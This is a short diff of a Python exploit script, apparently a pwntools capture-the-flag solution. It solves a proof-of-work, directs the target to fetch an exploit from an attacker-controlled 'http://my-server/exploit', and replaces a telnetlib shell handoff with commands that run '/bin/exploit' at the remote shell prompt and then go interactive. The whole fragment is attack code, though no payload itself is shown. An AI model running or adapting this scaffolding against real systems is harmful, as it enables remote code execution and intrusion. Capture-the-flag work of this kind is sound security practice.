@@ -13,7 +13,6 @@ print data
 r.sendline(os.popen('~/pow %s' % data).read())
 ii('y')
 go('http://my-server/exploit')
-import telnetlib
-t=telnetlib.Telnet()
-t.sock = r.sock
-t.interact()
+
+r.sendlineafter('$ ', '/bin/exploit')
+r.interactive()
